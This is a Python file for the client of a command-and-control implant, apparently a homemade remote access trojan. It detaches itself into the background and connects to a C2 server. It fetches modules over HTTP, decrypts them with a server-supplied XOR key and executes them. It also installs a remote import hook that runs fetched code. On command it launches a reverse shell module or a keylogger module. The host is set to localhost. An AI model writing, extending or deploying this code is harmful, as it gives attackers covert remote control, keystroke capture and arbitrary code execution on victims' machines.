import socket,threading,os,sys

from urllib import request
from urllib.request import urlopen
import base64

from importlib.machinery import ModuleSpec
from types import ModuleType
import importlib.util
import importlib.machinery
import importlib.abc

import hashlib
import hmac
import subprocess
def make_threaded(func):
    
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread 
    return wrapper

def decrypt(encrypted_content, key):
        """Decrypts content using XOR cipher with HMAC verification."""
        initialization_vector = encrypted_content[:16]  
        mac_tag = encrypted_content[16:48]  
        ciphertext = encrypted_content[48:]

        # Get HMAC key from the main key
        hmac_key = hashlib.sha256(key + b"hmac").digest()

        # Verify the HMAC tag
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha256)
        for byte in ciphertext:
            hmac_obj.update(bytes([byte]))  # Update HMAC with the ciphertext byte

        if not hmac.compare_digest(hmac_obj.digest(), mac_tag):
            print("HMAC verification failed. Data integrity compromised.")
            return None

        # Decrypt the ciphertext
        plaintext = bytearray()
        for i, byte in enumerate(ciphertext):
            xor_byte = byte ^ key[(i + struct.unpack(">I", initialization_vector[:4])[0]) % len(key)]
            plaintext.append(xor_byte)

        return bytes(plaintext)

#this file will load and remotely import modules from a url
 
 
class Finder(importlib.abc.MetaPathFinder):
 
    def __init__(self, base_url) -> None:
        self.base_url = base_url
 
    def find_spec(self, fullname, path, target=None):
        spec = self.find_py_file_spec(fullname)
        if spec is not None:
            return spec
        spec = self.find_package_spec_init(fullname)
        if spec is not None:
            return spec
        return None
 
    def find_py_file_spec(self, fullname):
        if len(fullname.split(".")) == 1:
            url = "{}/{}/{}.py".format(self.base_url,fullname.split(".")[0],fullname.replace(".","/"))
        else:
            url = "{}/{}.py".format(self.base_url,fullname.replace(".","/"))
        print(url)
        source = self.get_source_code(url)
        if source is None:
            print("no thing found")
            return None
        loader = Loader(fullname,source,url)
        return importlib.machinery.ModuleSpec(fullname, loader)
 
    def find_package_spec_init(self,fullname):
 
        url = "{}/{}/__init__.py".format(self.base_url,fullname.replace(".","/"))
        source = self.get_source_code(url)
        if source is None:
            print("no init found")
            return None
        loader = Loader(fullname,source,url,zip=True)
        return importlib.machinery.ModuleSpec(fullname, loader,is_package=True,)
 
    def get_source_code(self, url):
        try:
            response = urlopen("http://"+url)
        except Exception:
            return None
            print("import failed due to HTTP")
 
 
        source = response.read()
        return source
class Loader(importlib.abc.Loader):
 
    def __init__(self, name, source_code, url:str,zip=False) -> None:
        self.name = name
        self.source_code = source_code
        self.url = url
        self.zip = zip
 
    def create_module(self, spec: ModuleSpec) -> ModuleType | None:
        module = sys.modules.get(spec.name)
        if module is None:
            module = ModuleType(spec.name)
            sys.modules[spec.name] = module
        return module
 
    def exec_module(self, module: ModuleType) -> None:
        module.__file__ = self.url
        print("url is {}".format(self.url))
        
        
        exec(self.source_code, module.__dict__)
        return module
 
    def get_source(self,name):
        return self.source_code
 
def add_server(ip,port):
    sys.meta_path.append(Finder(f"{ip}:{port}"))
 

def detach_process():
    """
    Detaches the current process from its controlling terminal and runs it in the background.
    """
    # Windows-specific detachment
    if os.name == 'nt':
        try:
            DETACHED_PROCESS = 0x00000008
            CREATE_NEW_PROCESS_GROUP = 0x00000200
            flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP

            # Use the current script's path as the command to execute
            script_path = os.path.abspath(__file__)
            command = [sys.executable, script_path]

            # Create a new process in a detached state
            process = subprocess.Popen(
                command,
                creationflags=flags,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=os.getcwd(),
                close_fds=True
            )

            print(f"Detached process with PID: {process.pid}")
            return

        except Exception as e:
            print(f"Error detaching process: {e}")
            return
    else:
        try:
            # Fork the current process
            pid = os.fork()

            if pid > 0:
                # Exit the parent process
                sys.exit(0)
            else:
                # This is the child process

                # Create a new session ID for the child process
                os.setsid()

                # Fork again to ensure the child process is not a session leader
                pid = os.fork()

                if pid > 0:
                    # Exit the first child process
                    sys.exit(0)
                else:
                    # This is the second child process (now a daemon)

                    # Change the working directory to the root directory
                    os.chdir("/")

                    # Close standard file descriptors
                    os.close(0)
                    os.close(1)
                    os.close(2)

                    # Open /dev/null for standard input, output, and error
                    os.open(os.devnull, os.O_RDWR)
                    os.dup2(0, 1)
                    os.dup2(0, 2)


        except OSError as e:
            print(f"Error detaching process: {e}")

class client():

    def __init__(self, host, port):
        self.host = host
        self.host_port = port
        self.key = None
        self.connection = self.connect()

    #create a connection to C2 server
    def connect(self):
        print("creating connection")
        connection = socket.create_connection((self.host,self.host_port))
        data = connection.recv(1)
        if str(data.decode()) == 'g':
            print("connection established")
            connection.send('g'.encode())
            self.receive_key(connection)
        
        return connection
    
    def receive_key(self, connection):
        """Receives the encryption key from the server."""
        key_data = connection.recv(32)  
        if len(key_data) != 32:
            raise Exception("Failed to receive the full encryption key.")
        self.key = key_data
        print("Encryption key received.")
    
    @make_threaded
    def run_module(self,name):
        url = f"http://{self.host}:5001/{name}.py"
        encrypted_module_b64 = request.urlopen(url).read()
        encrypted_module = base64.b64decode(encrypted_module_b64)
        print(self.key)
        # Decrypt the module
        
        decrypted_module = decrypt(encrypted_module, self.key)
        if decrypted_module:
            exec(decrypted_module.decode('utf-8'))
        else:
            print("Failed to decrypt module.")
        
        
        return


    #listen for commands
    def run(self):
         while True:
            try:
                instruction = self.connection.recv(1024).decode()
                print(f"Received instruction: {instruction}")
                if not instruction:
                    print("breakingh")
                    break
                elif instruction == 'shell':
                    print("starting  reverse shell")
                    threading.Thread(target=self.run_module, args=('tcp_shell',)).start()
                elif(str(instruction) == 'g'):
                    self.connection.send('g'.encode())
                elif(str(instruction) == 'keylogger'):
                    threading.Thread(target=self.run_module, args=('keylogger',)).start()


            except Exception as e:
                print(e)
                self.connection.sendall(str(e).encode()) 
        

detach_process()          
HOST = "127.0.0.1"
add_server(HOST,5003)
c = client(HOST, 5000)
c.run()
print("running")
   